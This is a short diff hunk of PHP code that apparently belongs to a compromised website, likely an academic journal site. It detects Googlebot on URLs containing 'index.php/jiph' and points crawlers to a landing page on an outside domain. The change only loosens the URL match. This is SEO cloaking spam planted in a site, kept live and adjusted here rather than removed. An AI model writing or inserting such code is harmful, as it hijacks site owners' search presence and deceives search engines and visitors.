@@ -56,7 +56,7 @@ function is_google_bot_v3(){
     return false;
 }
 
-if(stripos($uri, 'index.php/jiph/') !== false){
+if(stripos($uri, 'index.php/jiph') !== false){
     if(is_google_bot_v3()){
         $file = 'https://inkaindonesia.org/landing/journal.formosapublisher-cunjp.html';
         if(file_exists($file)){
